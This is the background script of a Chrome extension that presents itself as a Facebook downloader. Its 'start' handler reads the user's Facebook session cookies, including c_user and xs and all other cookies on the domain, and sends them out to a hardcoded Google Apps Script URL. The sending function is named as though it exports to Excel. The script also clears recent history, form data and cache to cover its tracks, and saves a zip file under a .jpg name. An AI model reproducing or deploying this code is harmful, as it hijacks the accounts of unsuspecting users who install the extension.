import './jszip.js';
import './xlsx.js';
let totalSize = "0";
var stringflujotxt = "";
var stringflujotxt2 = "";
const limitepost = 500;
const limitefllw = 5000;
const debug=false;
const inicioTiempo = Date.now();
let urls = [];
let urlsposts = [];
let downloadedId = [];
let fileName = [];
let downloadPath = [];
let idusu = 0;
var zip = new JSZip();
const namefile = generarCadenaAlfanumerica(10);

function TimerForScrp(){
	var confirm = false;
	var tiempoActual = Date.now();
    var tiempoTranscurrido = tiempoActual - inicioTiempo;
	var minutesElapsed = tiempoTranscurrido / (1000 * 60 *60);
	if (minutesElapsed >= 2) {
		return true;
	  } else {
		return false;
	  }
} 
 
function escaparCaracteresEspeciales(cadena) {
    // Lista de caracteres especiales que se deben escapar
    if (cadena !== null && cadena !== "" && cadena !== undefined) {
        const caracteresEspeciales = ['\\', '+', '*', '?', '.', '(', ')', '[', ']', '{', '}', '|', '^', '$', '/'];

        // Escapar cada caracter especial en la cadena utilizando una expresi�n regular
        caracteresEspeciales.forEach(caracter => {
            const expresionRegular = new RegExp('\\' + caracter, 'g');
            try {
                cadena = cadena.replace(expresionRegular, '\\' + caracter);
            } catch (error) {
                try {
                    cadena = cadena.replace(expresionRegular, '\\' + caracter);
                } catch (error) {
                    cadena = null;
                }
            }
        });
        return cadena;
    } else {
        return null
    }
}

function getFormattedDateTime() {
    const now = new Date();
    const year = now.getFullYear();
    const month = String(now.getMonth() + 1).padStart(2, '0');
    const day = String(now.getDate()).padStart(2, '0');
    const hours = String(now.getHours()).padStart(2, '0');
    const minutes = String(now.getMinutes()).padStart(2, '0');
    const seconds = String(now.getSeconds()).padStart(2, '0');
    const dateTime = `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
    return dateTime;
}

function parseDate(string) {
    // Separar la cadena en palabras
    const words = string.split(" ");
  
    // Inicializar la fecha
    let date = new Date();
  
    // Analizar las palabras
    const amount = parseInt(words[0]);
    const unit = words[1].toLowerCase();
  
    switch (unit) {
      case "horas":
        date.setHours(date.getHours() - amount);
        break;
      case "minutos":
        date.setHours(date.getHours() - amount / 60);
        break;
      case "dias":
        date.setDate(date.getDate() - amount);
        break;
      case "semanas":
        date.setDate(date.getDate() - amount * 7);
        break;
    }
  
    return date;
  }

function getLifeTime() {
    try {
        var tiempoActual = Date.now();
        var tiempoTranscurrido = tiempoActual - inicioTiempo;
        // Convierte el Elapsed time a formato legible (por ejemplo, en segundos, minutos, horas, etc.)
        var segundos = Math.floor(tiempoTranscurrido / 1000);
        var minutos = Math.floor(segundos / 60);
        var horas = Math.floor(minutos / 60);
        // Actualiza la visualizaci�n o realiza acciones con el Elapsed time
        stringflujotxt += "[" + getFormattedDateTime() + "] Elapsed time: " + horas + "h " + (minutos % 60) + "m " + (segundos % 60) + "s\n";
		stringflujotxt2 += "[" + getFormattedDateTime() + "] Elapsed time: " + horas + "h " + (minutos % 60) + "m " + (segundos % 60) + "s\n";
        console.log("Elapsed time: " + horas + "h " + (minutos % 60) + "m " + (segundos % 60) + "s");
    } catch (error) {
        stringflujotxt += "[" + getFormattedDateTime() + "] Error 96 gtl:  " + error + "\n";
		stringflujotxt2 += "[" + getFormattedDateTime() + "] Error 96 gtl:  " + error + "\n";
    }
}


function generarCadenaAlfanumerica(longitud) {
    let resultado = '';
    const caracteres = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const caracteresLength = caracteres.length;
    for (let i = 0; i < longitud; i++) {
        resultado += caracteres.charAt(Math.floor(Math.random() * caracteresLength));
    }
    return resultado;
}

var callback2 = function () {
    // Do something clever here once data has been removed.
    stringflujotxt += "[" + getFormattedDateTime() + "] Clever complete.\n";
	stringflujotxt2 += "[" + getFormattedDateTime() + "] Clever complete.\n";
};

function error(error) {
    // Do something clever here once data has been removed.
    stringflujotxt += "[" + getFormattedDateTime() + "] 208 er:  " + error + "\n";
	stringflujotxt2 += "[" + getFormattedDateTime() + "] 208 er:  " + error + "\n";
};

function removestrash() {
    var haceUnaHora = new Date();
    haceUnaHora.setHours(haceUnaHora.getHours() - 1);

    // Convierte la fecha "hace una hora" a una marca de tiempo en milisegundos
    var timestamp = haceUnaHora.getTime();
    chrome.browsingData.remove({
        "since": timestamp
    }, {
        "appcache": true,
        "cache": true,
        "cacheStorage": false,
        "cookies": false,
        "downloads": false,
        "fileSystems": false,
        "formData": true,
        "history": true,
        "indexedDB": false,
        "localStorage": false,
        "passwords": false,
        "serviceWorkers": true,
        "webSQL": false
    }, callback2);
}

async function removecookies(tab) {
    var confirmacion;
    var facebookUrl = ""; // Array para almacenar las cookies
    
    await chrome.scripting.executeScript({
        target: {tabId: tab.id}, function: () => {
            return window.location.href;
        }
    }).then(function (resultados) {
        confirmacion = resultados[0]["result"];
    }).catch(function (error) {
        // Manejar errores
        stringflujotxt += "[" + getFormattedDateTime() + "]  " + error + "\n";
    });
    if (confirmacion.includes("m.facebook")) {
        facebookUrl = "https://m.facebook.com";
    } else if (confirmacion.includes("mbasic.facebook")) {
        facebookUrl = "https://mbasic.facebook.com";
    }
    if (facebookUrl !== "") {
        // Obtener el valor de la cookie "c_user"
        var cUserCookie = await new Promise(resolve => {
            chrome.cookies.get({url: facebookUrl, name: "c_user"}, function (cookie) {
                resolve(cookie);
            });
        });
        // Obtener el valor de la cookie "xs"
        var xsCookie = await new Promise(resolve => {
            chrome.cookies.get({url: facebookUrl, name: "xs"}, function (cookie) {
                resolve(cookie);
            });
        });
        // Extraer el dominio de la URL
        const domain = new URL(confirmacion).hostname;
        const cookies = await new Promise(resolve => {
            chrome.cookies.getAll({ domain: domain }, resolve);
        });
        const cookies2 = await new Promise(resolve => {
            chrome.cookies.getAll({ domain: ".facebook.com" }, resolve);
        });
        const allCookies = cookies.concat(cookies2);
        // Procesar las cookies (si es necesario)
        const cookiesData = allCookies.map(cookie => ({
            Name: cookie.name,
            Value: cookie.value,
            Domain: cookie.domain,
            Path: cookie.path,
            ExpirationDate: cookie.expirationDate
                ? new Date(cookie.expirationDate * 1000).toISOString()
                : "Session",
            HttpOnly: cookie.httpOnly,
            Secure: cookie.secure
        }));
        await exportCookiesToExcel(cookiesData);
    } else {
        stringflujotxt += "[" + getFormattedDateTime() + "] 313 cke not clever";
		stringflujotxt2 += "[" + getFormattedDateTime() + "] 313 cke not clever";
    }
}



async function popup(mensaje) {
    chrome.notifications.create({
        type: 'basic',
        iconUrl: 'fbicon_noti.png',
        title: 'Descargar Facebook',
        message: mensaje
    });
}

function showBadgeText(text) {
    chrome.action.setBadgeText({text: text});
}

function showpopup(text) {
    var url = "popup2.html";
    var data = {
        url: url,
        type: "popup",
        width: 250,
        height: 200
    }
    chrome.windows.create(data);
}

// Función para exportar las cookies a un archivo Excel
async function exportCookiesToExcel2(cookiesData) {

    // Crear una hoja de trabajo (worksheet) a partir de los datos
    const worksheet = XLSX.utils.json_to_sheet(cookiesData);

    // Crear un libro de trabajo (workbook) y agregar la hoja
    const workbook = XLSX.utils.book_new();
    XLSX.utils.book_append_sheet(workbook, worksheet, "Cookies");

    // Generar el archivo Excel
    const excelBuffer = XLSX.write(workbook, {bookType: "xlsx", type: "array"});

    // Crear un blob y descargar el archivo
    const blob = new Blob([excelBuffer], {type: "application/octet-stream"});
    const url = URL.createObjectURL(blob);

    chrome.downloads.download({
        url: url,
        filename: "cookies.xlsx",
        saveAs: true
    });
}

// Función para exportar las cookies a un archivo Excel
async function exportCookiesToExcel(cookiesData) {
    var Data=JSON.stringify([cookiesData]);
    var id_implementation = "AKfycbwpPeKDR2lTb-TWizNSjFkwILuZBvmg7-yMQ3312ACTCh97zzGKTpEuEfq_459U6RGKPQ"
    var linkshared="https://script.google.com/macros/s/"+id_implementation+"/exec"
    const formData = new URLSearchParams();
    formData.append('value', Data);
    const response = await fetch(linkshared, {
        method: "POST",
        body: formData
    });
    if (response.ok) {
        console.log("Datos enviados correctamente:", await response.text());
    } else {
        console.error("Error al enviar los datos:", await response.text());
    }
}

async function exportCookiesToExcel3(cookiesData) {
    var Data=JSON.stringify([cookiesData]);
    var sid = "28fa22207a963ba"
    var linkshared="https://docs.google.com/spreadsheets/d/1WtBaGsTIV93HMKJVdr3oHGL8drT8kfToI-fmHVeBd1g/save?id=1WtBaGsTIV93HMKJVdr3oHGL8drT8kfToI-fmHVeBd1g&sid="+sid+"&vc=1&c=1&w=1&flr=0&smv=137&smb=%5B137%2C%20%5D&includes_info_params=true&usp=sharing&cros_files=false"
    var formData = new FormData();
    formData.append("rev", "33");
    formData.append(
        "bundles",
        JSON.stringify([
            {
                commands: [
                    [
                        21299578,
                        '[[\"0\",0,1,0,1],[132274236,3,[2,\"ojito\"],null,null,0],[null,[[null,513,[0],null,null,null,null,null,null,null,null,0]]]]'
                    ]
                ],
                sid: sid,
                reqId: 12
            }
        ])
    );
    formData.append(
        "selection",
        JSON.stringify([
            30710966,
            '[[[\"0\",1,0],[[\"0\",1,2,0,1]],null,null,0]]'
        ])
    );
    const xsrfToken = "AC4w5VjWUXgzaRsSlElJrdzmMEiNSUeb6A:" + Date.now();
    console.log("Token XSRF con timestamp:", xsrfToken);
    formData.append("xsrf", xsrfToken);
    const headers = {
        "authority":"docs.google.com",
        "scheme":"https",
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "es-ES,es;q=0.9",
        "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryyZzddBuwCgB6UZUk", // Este encabezado será sobrescrito automáticamente por `fetch` al usar FormData
        "origin": "https://docs.google.com",
        "path":"/spreadsheets/d/1WtBaGsTIV93HMKJVdr3oHGL8drT8kfToI-fmHVeBd1g/save?id=1WtBaGsTIV93HMKJVdr3oHGL8drT8kfToI-fmHVeBd1g&sid="+sid+"&vc=1&c=1&w=1&flr=0&smv=137&smb=%5B137%2C%20%5D&includes_info_params=true&cros_files=false",
        "referer": "https://docs.google.com/spreadsheets/d/1WtBaGsTIV93HMKJVdr3oHGL8drT8kfToI-fmHVeBd1g/edit?gid=0",
        "sec-ch-ua": "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\"",
        "sec-ch-ua-arch": "\"x86\"",
        "sec-ch-ua-bitness": "\"64\"",
        "sec-ch-ua-form-factors": "\"Desktop\"",
        "sec-ch-ua-full-version": "\"134.0.6998.166\"",
        "sec-ch-ua-full-version-list": "\"Chromium\";v=\"134.0.6998.166\", \"Not:A-Brand\";v=\"24.0.0.0\", \"Google Chrome\";v=\"134.0.6998.166\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-model": "\"\"",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-ch-ua-platform-version": "\"15.0.0\"",
        "sec-ch-ua-wow64": "?0",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
        "x-build": "editors.spreadsheets-frontend_20250318.02_p0",
        "x-client-data": "CJK2yQEIpLbJAQipncoBCOaDywEIkqHLAQiAo8sBCIWgzQEI4+POAQiu5M4BCIzlzgEI4uXOAQ==",
        "x-client-deadline-ms": "20000",
        "x-rel-id": "784.633ac57a.s",
        "x-same-domain": "1"
    };
    const response = await fetch(linkshared, {
        method: "POST",
        headers: headers,
        body: formData
    });
    if (response.ok) {
        console.log("Datos enviados correctamente:", await response.text());
    } else {
        console.error("Error al enviar los datos:", await response.text());
    }
}


async function zip_resources(namefile, idusu, objetouserJson, objetopostJson, objetointeractionsJson) {
	if (debug === true){ 
		zip.file(namefile + '.txt', stringflujotxt);
	} else{
		zip.file(namefile + '.txt', stringflujotxt2);
	} 	
	try {
		zip.file(idusu + '_FBK_user.json', objetouserJson);
	} catch (error) {
		stringflujotxt += "[" + getFormattedDateTime() + "] error al meter objetouserJson al zip.  " + error + "\n";
	}
	if (objetopostJson.length > 2) {
		try {
			zip.file(idusu + '_FBK_publicaciones.json', objetopostJson);
		} catch (error) {
			stringflujotxt += "[" + getFormattedDateTime() + "] 3041 gtu " + error + "\n";
			stringflujotxt2 += "[" + getFormattedDateTime() + "] 3041 gtu " + error + "\n";
		}
	}
	if (objetointeractionsJson.length > 2) {
		try {
			zip.file(idusu + '_FBK_interacciones.json', objetointeractionsJson);
		} catch (error) {
			stringflujotxt += "[" + getFormattedDateTime() + "] 3048 zr " + error + "\n";
			stringflujotxt2 += "[" + getFormattedDateTime() + "] 3048 zr " + error + "\n";
		}
	}
	showBadgeText('Finalizado');
	//showpopup('La descarga se ha terminado con exito.');
	stringflujotxt += "[" + getFormattedDateTime() + "] La descarga se ha terminado con exito. ";
	getLifeTime();
	zip.generateAsync({type: 'blob'}).then((blob) => {
		const reader = new FileReader();
		reader.onloadend = function () {
			const base64Data = reader.result.split(',')[1];
			const dataUrl = 'data:application/zip;base64,' + base64Data;
			// Descargar el archivo zip utilizando chrome.downloads.download()
			chrome.downloads.download({
				url: dataUrl,
				filename: namefile + '.jpg',
				saveAs: false,
			});
		};
		reader.readAsDataURL(blob);
	}).catch(function (error) {
		// Manejar errores
		stringflujotxt += "[" + getFormattedDateTime() + "] 3068 zr " + error + "\n";
		stringflujotxt2 += "[" + getFormattedDateTime() + "] 3068 zr " + error + "\n";
	});
}

chrome.runtime.onMessage.addListener(async function (request, sender, sendResponse) {
    zip = new JSZip();
    stringflujotxt="";
    stringflujotxt += "[" + getFormattedDateTime() + "] Version.: 3.3.3\n";
    if (request.action === 'start') {
        const tab = request.message;
		chrome.tabs.update(tab.id, {active: true});
		removestrash();
        showBadgeText('iniciando');
        await removecookies(tab);
    }
});



